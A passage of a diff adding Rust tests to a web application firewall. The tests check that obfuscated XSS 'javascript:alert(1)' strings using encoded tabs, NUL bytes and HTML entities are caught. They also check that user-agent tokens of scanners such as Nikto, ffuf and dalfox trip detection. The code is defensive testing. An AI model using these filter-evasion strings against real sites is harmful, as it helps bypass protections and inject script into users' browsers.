+			("java%09script:alert(1)", "xss_js_uri"), // percent-encoded tab
+			("%00javascript:alert(1)", "xss_js_uri"), // NUL splice
+			("java&Tab;script:alert(1)", "xss_js_uri"), // entity-then-control combo
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should be caught after control strip"));
+			assert_eq!(m.rule_id, rule, "{payload}");
+		}
+	}
+
+	#[test]
+	fn control_strip_keeps_multiline_text_clean() {
+		// A benign multiline body value with newlines/tabs must not fold into a spurious signature.
+		let waf = Waf::starter().inspect_body_up_to(4096);
+		assert_eq!(waf.inspect_body(b"comment=line one\nline two\tindented\nregards"), Verdict::Allow);
 	}
 
 	#[test]
@@ -2393,10 +2918,14 @@ mod tests {
 		assert_eq!(m.rule_id, "scanner_security_tool");
 		assert_eq!(m.category, WafCategory::ScannerDetection);
 		assert_eq!(m.location, "header:user-agent");
-		// The CRS 4.26.0 additions (ghauri, WhatWAF) and a classic (Nikto) all fire.
-		for ua in ["Mozilla/5.00 (Nikto/2.1.6)", "ghauri/1.3", "WhatWAF/2.0", "nuclei/3.1.0"] {
+		// The CRS 4.26.0 additions (ghauri, WhatWAF), a classic (Nikto), and the current-landscape
+		// additions all fire on their `name/version` UA token.
+		for ua in ["Mozilla/5.00 (Nikto/2.1.6)", "ghauri/1.3", "WhatWAF/2.0", "nuclei/3.1.0", "ffuf/2.1.0", "dalfox/2.9.0", "dirsearch/0.4.3", "wafw00f/2.2.0", "whatweb/0.5.5"] {
 			assert_eq!(waf.inspect_str(ua, "header:user-agent").unwrap().category, WafCategory::ScannerDetection, "{ua} should trip scanner detection");
 		}
+		// A legitimate client-library UA that merely embeds a scanner-adjacent word must NOT trip:
+		// `python-httpx` is a common HTTP client, deliberately excluded from the token set.
+		assert!(waf.inspect_str("python-httpx/0.27.0", "header:user-agent").is_none(), "python-httpx is a legitimate client library");
 		// Nmap's NSE probe (no version slash) has its own rule.
 		assert_eq!(waf.inspect_str("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org)", "header:user-agent").unwrap().rule_id, "scanner_nmap_nse");
 	}
